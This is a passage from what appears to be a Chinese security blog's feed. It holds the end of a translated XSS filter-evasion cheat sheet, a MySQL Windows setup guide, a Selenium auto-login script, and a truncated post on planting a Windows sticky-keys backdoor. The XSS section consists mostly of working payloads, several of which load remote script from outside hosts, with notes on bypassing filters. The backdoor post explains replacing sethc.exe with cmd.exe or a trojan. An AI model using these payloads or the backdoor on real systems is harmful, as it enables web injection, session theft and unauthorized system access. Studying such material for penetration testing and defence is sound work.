title="编码回车符去分开xss代码"></a>编码回车符去分开xss代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="没有分割的javascript指令"><a href="#没有分割的javascript指令" class="headerlink" title="没有分割的javascript指令"></a>没有分割的javascript指令</h4><p>null字符也可以作为一个xss向量，但是不像上边那样。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器用过变动像这个例子中的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</div></pre></td></tr></table></figure></p><h4 id="图片元素中javascript之前的空格和元字符为xss"><a href="#图片元素中javascript之前的空格和元字符为xss" class="headerlink" title="图片元素中javascript之前的空格和元字符为xss"></a>图片元素中javascript之前的空格和元字符为xss</h4><p>xss过滤拼配模式没有考虑单词”javascript:”中可能存在空格是正确的，因为否则将无法渲染。但是这也导致了错误的假设认为你不可以有一个空格在引号和 “javascript:” 单词之间。事实上你可以插入 1-32编码字符（十进制）中的任何字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p><h4 id="非字母数字字符xss"><a href="#非字母数字字符xss" class="headerlink" title="非字母数字字符xss"></a>非字母数字字符xss</h4><p>Firefox html解析器设定一个非数字字母字符不是有效的在一个html关键字后面，因此这些字符会被视为空白符或是无效的token在html标签之后。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。</p><h5 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT/XSS SRC=&quot;http://damit5.ml/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure><p>和上面的原理相同，我们继续扩大，Gecko渲染引擎允许字母、数字、html封装字符以外的任何字符位于事件处理器与等号之间。从而借此绕过xss过滤器。注意这也是适用于重音符如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</div></pre></td></tr></table></figure></p><p>Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是他们仅允许一个一个斜杠在html标签和参数之间，在不使用空格的情况下。这可能是有用的在那些不允许输入空格的系统中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT/SRC=&quot;http://damit5.ml/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure></p><h4 id="附加的开括号"><a href="#附加的开括号" class="headerlink" title="附加的开括号"></a>附加的开括号</h4><p>Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过拼配最早出现的一对尖括号，并且提取其内部内容作为标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。代码中的双斜杠可以抑制额外尖括号导致的javascript错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure></p><h4 id="没关闭的script标签"><a href="#没关闭的script标签" class="headerlink" title="没关闭的script标签"></a>没关闭的script标签</h4><p>对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中”&gt;“这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=http://damit5.ml/xss.js?&lt; B &gt;</div></pre></td></tr></table></figure></p><h4 id="script标签中的协议解析"><a href="#script标签中的协议解析" class="headerlink" title="script标签中的协议解析"></a>script标签中的协议解析</h4><p>这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 “.j”是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</div></pre></td></tr></table></figure></p><h4 id="半开的HTML-JavaScript-xss向量"><a href="#半开的HTML-JavaScript-xss向量" class="headerlink" title="半开的HTML/JavaScript xss向量"></a>半开的HTML/JavaScript xss向量</h4><p>不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指定在图片标签中这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以插入这个xss向量在任何html标签后面。甚至没有用”&gt;”关闭标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ because it doesn’t require the end “&gt;”. 这也是有效的去对付真实的xss过滤器，我曾经碰见过试用半开的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</div></pre></td></tr></table></figure></p><h4 id="双开尖括号"><a href="#双开尖括号" class="headerlink" title="双开尖括号"></a>双开尖括号</h4><p>使用一个开始尖括号(&lt;)在向量结尾代替一个关闭尖括号（&gt;）会有不同的影响在 Netscape Gecko 的渲染中。 Without it, Firefox will work but Netscape won’t。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=http://damit5.ml/xss.html &lt;</div></pre></td></tr></table></figure></p><h4 id="转义javascript中的转义"><a href="#转义javascript中的转义" class="headerlink" title="转义javascript中的转义"></a>转义javascript中的转义</h4><p>当一个应用程序是输出用户自定义的信息到javascript代码中，例如：<br><code>&lt;SCRIPT&gt;var a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/SCRIPT&gt;</code><br>如果你想插入你自己的javascript代码进入它，但是服务器转义了其中的某些引号，这时你需要通过转义被转义的字符来绕过它。从而使最终的输入代码类似于<code>&lt;SCRIPT&gt;var a=&quot;\&quot;;alert(&#39;XSS&#39;);//&quot;;&lt;/SCRIPT&gt;</code> 。最终\转义了双引号前被服务器添加的\，而双引号则不会被转义，从而触发xss向量。xss定位器使用这个方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\&quot;;alert(&apos;XSS&apos;);//</div></pre></td></tr></table></figure></p><h4 id="闭合title标签"><a href="#闭合title标签" class="headerlink" title="闭合title标签"></a>闭合title标签</h4><p>这是一个简单的xss向量，可以引入一个恶意的xss攻击。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure></p><h4 id="INPUT-image"><a href="#INPUT-image" class="headerlink" title="INPUT image"></a>INPUT image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="BODY-image"><a href="#BODY-image" class="headerlink" title="BODY image"></a>BODY image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h4 id="IMG-DYNSRC-视频剪辑"><a href="#IMG-DYNSRC-视频剪辑" class="headerlink" title="IMG DYNSRC(视频剪辑)"></a>IMG DYNSRC(视频剪辑)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h4 id="IMG-lowsrc（低分辨率图片）"><a href="#IMG-lowsrc（低分辨率图片）" class="headerlink" title="IMG lowsrc（低分辨率图片）"></a>IMG lowsrc（低分辨率图片）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure><h4 id="List-style-image"><a href="#List-style-image" class="headerlink" title="List-style-image"></a>List-style-image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</div></pre></td></tr></table></figure><h4 id="List-style-image-1"><a href="#List-style-image-1" class="headerlink" title="List-style-image"></a>List-style-image</h4><p>为带有符号的列表嵌入自定义图片的符号。它是只能工作在ie渲染引擎因为javascript指令。这不是一个特别有用的xss向量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</div></pre></td></tr></table></figure></p><h4 id="VBscript-in-an-image"><a href="#VBscript-in-an-image" class="headerlink" title="VBscript in an image"></a>VBscript in an image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</div></pre></td></tr></table></figure><h4 id="Livescript-仅适用于老版本的Netscape"><a href="#Livescript-仅适用于老版本的Netscape" class="headerlink" title="Livescript (仅适用于老版本的Netscape)"></a>Livescript (仅适用于老版本的Netscape)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;</div></pre></td></tr></table></figure><h4 id="BGSOUND-背景音乐"><a href="#BGSOUND-背景音乐" class="headerlink" title="BGSOUND(背景音乐)"></a>BGSOUND(背景音乐)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><h4 id="amp-JavaScript-包含"><a href="#amp-JavaScript-包含" class="headerlink" title="&amp; JavaScript 包含"></a>&amp; JavaScript 包含</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BR SIZE=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</div></pre></td></tr></table></figure><h4 id="样式表"><a href="#样式表" class="headerlink" title="样式表"></a>样式表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure><div id="aplayer12" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer12"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;写在最前面&quot;&gt;&lt;a href=&quot;#写在最前面&quot; class=&quot;headerlink&quot; title=&quot;写在最前面:::&quot;&gt;&lt;/a&gt;写在最前面:::&lt;/h4&gt;&lt;p&gt;下文中 &lt;code&gt;alert&lt;/code&gt; 都可以由 &lt;code&gt;prompt&lt;/code&gt; 代替&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://damit5.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Windows MySQL 的安装</title>
    <link href="https://damit5.com/2017/09/30/Windows-MySQL-%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <id>https://damit5.com/2017/09/30/Windows-MySQL-的安装/</id>
    <published>2017-09-30T06:06:45.000Z</published>
    <updated>2018-06-10T03:59:38.612Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>第一次在Windows安装MySQL真的是安装得各种无语，遇到各种坑，这次写下来，希望以后不会再犯了！！！</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">启动: net start MySQL</div><div class="line"></div><div class="line">停止: net stop MySQL</div><div class="line"></div><div class="line">卸载: sc delete MySQL</div></pre></td></tr></table></figure><h4 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h4><p>打开mysql官网下载页面：//dev.mysql.com/downloads/mysql/</p><p>选择相应的版本和平台</p><p>下载压缩包，解压</p><h4 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h4><p>打开刚刚解压的文件夹，发现里面有my-default.ini配置文件，这个是默认的配置文件，复制一个自己的改名字为my.ini（没有的话自己创建一个）</p><p>编写 my.ini 配置以下基本信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[mysql]</div><div class="line"># 设置mysql客户端默认字符集</div><div class="line">default-character-set=utf8</div><div class="line"> </div><div class="line">[mysqld]</div><div class="line"># 设置3306端口</div><div class="line">port = 3306</div><div class="line"># 设置mysql的安装目录</div><div class="line">basedir=D:\Program Files\MySQL\mysql-5.7.19-winx64</div><div class="line"># 设置mysql数据库的数据的存放目录</div><div class="line">datadir=D:\Program Files\MySQL\mysql-5.7.19-winx64\Data</div><div class="line"># 允许最大连接数</div><div class="line">max_connections=20</div><div class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集</div><div class="line">character-set-server=utf8</div><div class="line"># 创建新表时将使用的默认存储引擎</div><div class="line">default-storage-engine=INNODB</div></pre></td></tr></table></figure></p><h4 id="3-安装启动mysql"><a href="#3-安装启动mysql" class="headerlink" title="3.安装启动mysql"></a>3.安装启动mysql</h4><p>用管理员身份打开CMD</p><p>cd到bin目录</p><p>然后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysqld install #出现安装成功即可</div><div class="line"></div><div class="line">net start mysql #启动mysql</div></pre></td></tr></table></figure></p><blockquote><p>结果发现在cmd里启动发现没法启动</p></blockquote><p>网上搜索了下发现是5.7版本才有这个问题，要在bin目录下手动初始化data目录</p><p>cd到bin目录下先初始化</p><ol><li><p><code>mysqld --initialize-insecure</code>自动生成无密码的root用户，</p></li><li><p><code>mysqld --initialize</code>自动生成带随机密码的root用户</p></li></ol><p>这里选择1. <code>mysqld --initialize-insecure</code></p><p>初始化后再运行<code>net start mysql</code> 成功启动mysql  ..</p><h4 id="4-进入mysql环境"><a href="#4-进入mysql环境" class="headerlink" title="4.进入mysql环境"></a>4.进入mysql环境</h4><p>配置环境变量</p><p>将bin目录加入到环境变量中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -u root  #因为此时没有密码</div></pre></td></tr></table></figure><hr><p>windows 下设置root密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">方法1： 用SET PASSWORD命令</div><div class="line">首先登录MySQL。</div><div class="line">格式：mysql&gt; set password for 用户名@localhost = password(&apos;新密码&apos;);</div><div class="line">例子：mysql&gt; set password for root@localhost = password(&apos;123&apos;);</div><div class="line"></div><div class="line">方法2：用mysqladmin</div><div class="line">格式：mysqladmin -u用户名 -p旧密码 password 新密码</div><div class="line">例子：mysqladmin -uroot -p123456 password 123</div><div class="line"></div><div class="line">方法3：用UPDATE直接编辑user表</div><div class="line">首先登录MySQL。</div><div class="line">mysql&gt; use mysql;</div><div class="line">mysql&gt; update user set password=password(&apos;123&apos;) where user=&apos;root&apos; and host=&apos;localhost&apos;;</div><div class="line">mysql&gt; flush privileges;</div><div class="line"></div><div class="line">方法4：在忘记root密码的时候，可以这样</div><div class="line">以windows为例：</div><div class="line">1. 关闭正在运行的MySQL服务。</div><div class="line">2. 打开DOS窗口，转到mysql\bin目录。</div><div class="line">3. 输入mysqld --skip-grant-tables 回车。--skip-grant-tables 的意思是启动MySQL服务的时候跳过权限表认证。</div><div class="line">4. 再开一个DOS窗口（因为刚才那个DOS窗口已经不能动了），转到mysql\bin目录。</div><div class="line">5. 输入mysql回车，如果成功，将出现MySQL提示符 &gt;。</div><div class="line">6. 连接权限数据库： use mysql; 。</div><div class="line">6. 改密码：update user set password=password(&quot;123&quot;) where user=&quot;root&quot;;（别忘了最后加分号） 。</div><div class="line">7. 刷新权限（必须步骤）：flush privileges;　。</div><div class="line">8. 退出 quit。</div><div class="line">9. 注销系统，再进入，使用用户名root和刚才设置的新密码123登录。</div></pre></td></tr></table></figure></p><div id="aplayer11" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer11"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次在Windows安装MySQL真的是安装得各种无语，遇到各种坑，这次写下来，希望以后不会再犯了！！！&lt;/p&gt;
    
    </summary>
    
    
      <category term="其他" scheme="https://damit5.com/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>利用Python Selenium库模拟登陆</title>
    <link href="https://damit5.com/2017/09/30/%E5%88%A9%E7%94%A8Python-Selenium%E5%BA%93%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86/"/>
    <id>https://damit5.com/2017/09/30/利用Python-Selenium库模拟登陆/</id>
    <published>2017-09-30T06:04:35.000Z</published>
    <updated>2018-06-10T04:00:19.151Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>Python模拟登陆让不少人伤透脑筋，今天奉上一种万能登陆方法。你无须精通HTML，甚至也无须精通Python，但却能让你成功的进行模拟登陆。本文讲的是登陆所有网站的一种方法，并不局限于微博，仅用其作为例子来讲解。</p><a id="more"></a><h2 id="0x01-材料必备"><a href="#0x01-材料必备" class="headerlink" title="0x01 材料必备"></a>0x01 材料必备</h2><ul><li>Python环境</li><li>selenium库</li><li>Chrome XPath Helper 插件（可选）<blockquote><p>PS:selenium是借助浏览器而运行的，因此需要额外下载一款小型浏览器。本文使用的是<a href="https://chromedriver.storage.googleapis.com/index.html?path=2.32/" target="_blank" rel="external">Chrome Webdriver</a></p></blockquote></li></ul><h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><ul><li>导入模块，创建webdriver对象</li><li>打开登录页面</li><li>找到元件传入内容</li></ul><h2 id="0x03-正式开始"><a href="#0x03-正式开始" class="headerlink" title="0x03 正式开始"></a>0x03 正式开始</h2><h4 id="导入selenium库"><a href="#导入selenium库" class="headerlink" title="导入selenium库"></a>导入selenium库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div></pre></td></tr></table></figure><h4 id="明确模拟浏览器在电脑中存放的位置，比如我放在了当前文件目录"><a href="#明确模拟浏览器在电脑中存放的位置，比如我放在了当前文件目录" class="headerlink" title="明确模拟浏览器在电脑中存放的位置，比如我放在了当前文件目录"></a>明确模拟浏览器在电脑中存放的位置，比如我放在了当前文件目录</h4><blockquote><p>用selenium的webdriver方程指明浏览器的路径，同时打开一个浏览器。模拟浏览器有多种可选,比如Firefox, Safari。本次用的是谷歌的模拟浏览器。注意：’.Chome’是大写字母。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">driver = webdriver.Chrome(executable_path=&quot;./chromedriver.exe&quot;)</div></pre></td></tr></table></figure></p></blockquote><h4 id="打开网页（本次模拟登陆新浪微博）"><a href="#打开网页（本次模拟登陆新浪微博）" class="headerlink" title="打开网页（本次模拟登陆新浪微博）"></a>打开网页（本次模拟登陆新浪微博）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">driver.get(&apos;https://login.sina.com.cn/signup/signin.php?entry=sso&apos;)</div></pre></td></tr></table></figure><h4 id="利用XPath-Helper-查找元件位置并传入数据"><a href="#利用XPath-Helper-查找元件位置并传入数据" class="headerlink" title="利用XPath Helper 查找元件位置并传入数据"></a>利用XPath Helper 查找元件位置并传入数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">driver.find_element_by_xpath(登陆元件位置).send_keys(&apos;账号&apos;)</div><div class="line">driver.find_element_by_xpath(密码元件位置).send_keys(&apos;密码&apos;)</div><div class="line">driver.find_element_by_xpath(登陆按钮).click()</div></pre></td></tr></table></figure><h2 id="0x04-附上懒人脚本"><a href="#0x04-附上懒人脚本" class="headerlink" title="0x04 附上懒人脚本"></a>0x04 附上懒人脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div><div class="line"></div><div class="line">driver = webdriver.Chrome(executable_path=&quot;./chromedriver.exe&quot;)</div><div class="line">driver.get(&apos;https://login.sina.com.cn/signup/signin.php?entry=sso&apos;)</div><div class="line">name = raw_input(&apos;Please input your account number : &apos;)</div><div class="line">password = raw_input(&apos;Please input your password : &apos;)</div><div class="line">driver.find_element_by_xpath(r&quot;/html/body/div[@id=&apos;wrap&apos;]/div[@class=&apos;iforgot_bd&apos;]/div[@class=&apos;iforgot_cont&apos;]/div[@class=&apos;i_mod&apos;]/form[@id=&apos;vForm&apos;]/div[@class=&apos;main_cen&apos;]/div[@class=&apos;form_mod&apos;]/ul[@class=&apos;form_list&apos;]/li[@class=&apos;item&apos;][1]/input[@id=&apos;username&apos;]&quot;).send_keys(name)</div><div class="line">driver.find_element_by_xpath(r&quot;/html/body/div[@id=&apos;wrap&apos;]/div[@class=&apos;iforgot_bd&apos;]/div[@class=&apos;iforgot_cont&apos;]/div[@class=&apos;i_mod&apos;]/form[@id=&apos;vForm&apos;]/div[@class=&apos;main_cen&apos;]/div[@class=&apos;form_mod&apos;]/ul[@class=&apos;form_list&apos;]/li[@class=&apos;item&apos;][2]/input[@id=&apos;password&apos;]&quot;).send_keys(password)</div><div class="line">driver.find_element_by_xpath(r&quot;/html/body/div[@id=&apos;wrap&apos;]/div[@class=&apos;iforgot_bd&apos;]/div[@class=&apos;iforgot_cont&apos;]/div[@class=&apos;i_mod&apos;]/form[@id=&apos;vForm&apos;]/div[@class=&apos;main_cen&apos;]/div[@class=&apos;form_mod&apos;]/ul[@class=&apos;form_list&apos;]/li[@class=&apos;item&apos;][6]/div[@class=&apos;btn_mod&apos;]/input[@class=&apos;W_btn_a btn_34px&apos;]&quot;).click()</div></pre></td></tr></table></figure><h2 id="0x05-附加：将cookie传入requests"><a href="#0x05-附加：将cookie传入requests" class="headerlink" title="0x05 附加：将cookie传入requests"></a>0x05 附加：将cookie传入requests</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">req = requests.Session()</div><div class="line">cookies = wd.get_cookies()</div><div class="line">for cookie in cookies:</div><div class="line">    req.cookies.set(cookie[&apos;name&apos;],cookie[&apos;value&apos;])</div><div class="line"></div><div class="line">后面就可以直接用req访问页面了</div></pre></td></tr></table></figure><div id="aplayer13" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer13"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python模拟登陆让不少人伤透脑筋，今天奉上一种万能登陆方法。你无须精通HTML，甚至也无须精通Python，但却能让你成功的进行模拟登陆。本文讲的是登陆所有网站的一种方法，并不局限于微博，仅用其作为例子来讲解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://damit5.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Windows Shift 后门</title>
    <link href="https://damit5.com/2017/09/30/Windows-Shift-%E5%90%8E%E9%97%A8/"/>
    <id>https://damit5.com/2017/09/30/Windows-Shift-后门/</id>
    <published>2017-09-30T06:03:19.000Z</published>
    <updated>2018-06-10T03:59:53.764Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><p>我们都知道，windows系统按<strong>5</strong>下<strong>shift</strong>后，windows就执行了<strong>system32</strong>下的<strong>sethc.exe</strong>，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。</p><a id="more"></a><h2 id="偷天换日"><a href="#偷天换日" class="headerlink" title="偷天换日 :::"></a>偷天换日 :::</h2><p>1.将我们的<strong>cmd.exe</strong>或者<strong>木马后门</strong>名字改成<strong>sethc.exe</strong>，然后替换<strong>C:windows\system32\sethc.exe</strong>程序</p><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/K4jdluh80WJSciTqmNp1AQ62vbhGbP2FWHT6C6683Zk!/r/dDwBAAAAAAAA" alt="1"></p><blockquote><p>如果弹出 <strong>“你需要TrustedInstaller提供的权限才能修改此文件”</strong></p><p>修改的文件右击 –&gt; 属性 –&gt; 安全 –&gt; 高级 –&gt; 更改所有者 –&gt; 当前用户 –&gt; 确定 –&gt; 重复之前步骤知道高级 –&gt; 编辑权限为完全控制</p></blockquote><p>2.按<strong>5</strong>下<strong>shift</strong>键可以调出cmd命令窗口，也可以添加用户</p><p><img src="//r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/2lNXxk7hpSq4XWiVg4L.SfPH7s0OlPdaPJoyy8MDGrc!/r/dOYAAAAAAAAA" alt="2"></p><h2 id="类似程序"><a href="#类似程序" class="headerlink" title="类似程序 :::"></a>类似程序 :::</h2><h4 id="放大镜-Magnify-exe"><a href="#放大镜-Magnify-exe" class="headerlink" title="放大镜 ::: Magnify.exe"></a>放大镜 ::: Magnify.exe</h4><blockquote><p><strong>win</strong> 和 <strong>+</strong> 同时按</p></blockquote><h4 id="讲述人-Narrator-exe"><a href="#讲述人-Narrator-exe" class="headerlink" title="讲述人 ::: Narrator.exe"></a>讲述人 ::: Narrator.exe</h4><blockquote><p><strong>win</strong> 和 <strong>enter</strong> 同时按</p></blockquote><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后 :::"></a>写在最后 